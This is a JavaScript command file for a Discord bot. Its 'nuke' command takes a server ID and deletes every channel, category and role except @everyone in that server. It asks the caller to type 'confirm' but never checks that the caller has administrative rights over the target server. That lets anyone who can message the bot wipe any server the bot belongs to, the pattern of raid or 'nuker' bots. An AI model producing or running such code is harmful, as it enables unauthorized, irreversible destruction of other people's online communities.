module.exports = {
    name: 'nuke',
    description: 'Delete all channels, categories, and roles from the specified server by ID.',

    run: async (client, message, args) => {
        const serverId = args[0]; // Expect the server ID as the first argument
        const isInServer = message.guild && message.guild.id === serverId;

        // Check if a server ID was provided
        if (!serverId) {
            return message.channel.send("Please provide a server ID to nuke.");
        }

        // Fetch the target server (guild) by ID
        const targetGuild = client.guilds.cache.get(serverId);

        if (!targetGuild) {
            return message.channel.send(`Could not find the server with ID: ${serverId}.`);
        }

        // Warn the user without @everyone ping
        try {
            await message.channel.send(`⚠️ Are you sure you want to nuke the server **${targetGuild.name}**? This will delete all channels, categories, and roles (except @everyone). Type 'confirm' to proceed.`);
        } catch (err) {
            console.error("Error sending confirmation message:", err);
        }

        // Await user confirmation
        const filter = (response) => response.author.id === message.author.id && response.content.toLowerCase() === 'confirm';
        const collector = message.channel.createMessageCollector({ filter, time: 10000 });

        collector.on('collect', async () => {
            try {
                // Delete all channels in the target server
                await Promise.all(targetGuild.channels.cache.map(channel => channel.delete()));

                // Inform the user after successful channel deletion
                if (!isInServer) {
                    await message.channel.send(`🧨 All channels and categories in **${targetGuild.name}** deleted!`);
                }

                // Delete all roles except @everyone
                await Promise.all(targetGuild.roles.cache.map(role => {
                    if (role.name !== "@everyone") {
                        return role.delete();
                    }
                }));

                // Inform the user after roles deletion
                if (!isInServer) {
                    await message.channel.send(`🧨 All roles deleted in **${targetGuild.name}** except @everyone!`);
                }
            } catch (error) {
                console.error("Error during nuke operation:", error);

                // Fallback message if something goes wrong
                if (!isInServer) {
                    await message.channel.send("An error occurred while nuking the server.");
                }
            }

            collector.stop();
        });

        collector.on('end', collected => {
            if (collected.size === 0) {
                try {
                    message.channel.send('❌ Nuke operation canceled.');
                } catch (err) {
                    console.error("Error sending cancellation message:", err);
                }
            }
        });
    }
};
